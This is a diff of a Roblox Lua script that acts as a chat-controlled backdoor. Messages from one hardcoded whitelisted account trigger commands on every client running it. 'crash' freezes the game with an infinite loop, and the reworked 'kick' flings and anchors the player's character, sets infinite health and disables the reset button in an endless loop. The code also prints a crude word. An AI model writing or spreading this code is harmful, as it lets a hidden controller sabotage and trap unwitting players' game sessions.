@@ -1,50 +1,50 @@
 local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-
 local Whitelist = { "jdurieivfbd12" }
 
 local cmds = {
     ["crash"] = function()
         while true do
-            print("Penis")
+            print("Penis") -- 테스트용
         end
     end,
 
-    ["kick"] = function(_, targetPlayerName)
-        local target = nil
-        targetPlayerName = targetPlayerName:lower()
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr.Name:lower() == targetPlayerName then
-                target = plr
-                break
-            end
-        end
-        if not target then return end
-        if target.Character then
-            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then
-
+    ["kick"] = function(_, _)
+        if LocalPlayer.Character then
+            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local Hocf = hrp and hrp.CFrame
+            if hrp and Hocf then
+                hrp.CFrame = CFrame.new(1e7, 1e7, 1e7)
+                task.wait(0.1)
                 hrp.Anchored = true
-
-
-                local fixedPos = Vector3.new(hrp.Position.X, 50, hrp.Position.Z)
-
-
-                local connection
-                connection = RunService.Heartbeat:Connect(function()
-                    if hrp and hrp.Parent then
-                        hrp.CFrame = CFrame.new(fixedPos)
-                    else
-                        connection:Disconnect()
-                    end
-                end)
+                task.wait(0.03)
+                hrp.CFrame = Hocf
             end
+
+            local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = math.huge
+            end
+
+            LocalPlayer.CharacterAdded:Connect(function(char)
+                local newHum = char:WaitForChild("Humanoid")
+                newHum.Health = math.huge
+            end)
+
+            -- 제설정 버튼 비활성화 반복
+            task.spawn(function()
+                repeat
+                    task.wait()
+                    pcall(function()
+                        game.StarterGui:SetCore("ResetButtonCallback", false)
+                    end)
+                until false
+            end)
         end
     end,
 
-    ["bring"] = function(_, Admin)
+    ["bring"] = function(Admin)
         if LocalPlayer.Character and Admin.Character then
             local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
             local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
@@ -90,6 +90,7 @@ end
 TextChatService.OnIncomingMessage = function(message)
     local sender = message.TextSource
     if not sender then return end
+
     local senderName = sender.Name
     if not isWhitelisted(senderName) then return end
 
@@ -100,23 +101,12 @@ TextChatService.OnIncomingMessage = function(message)
         local TargetName = table.remove(args, 1)
         local Data = table.concat(args, " ")
 
-        if Command then
+        if Command and TargetName and cmds[Command] then
             Command = Command:lower()
-            if cmds[Command] then
+            local Target = FindMatch(TargetName)
+            if TargetName == "all" or Target == LocalPlayer or TargetName:lower() == LocalPlayer.Name:lower() then
                 pcall(function()
-                    if TargetName then
-
-                        if Command == "kick" then
-                            cmds[Command](sender, TargetName)
-                        else
-                            local Target = FindMatch(TargetName)
-                            if TargetName == "all" or Target == LocalPlayer or TargetName:lower() == LocalPlayer.Name:lower() then
-                                cmds[Command](sender, Data)
-                            end
-                        end
-                    else
-                        cmds[Command](sender, Data)
-                    end
+                    cmds[Command](sender, Data)
                 end)
             end
         end
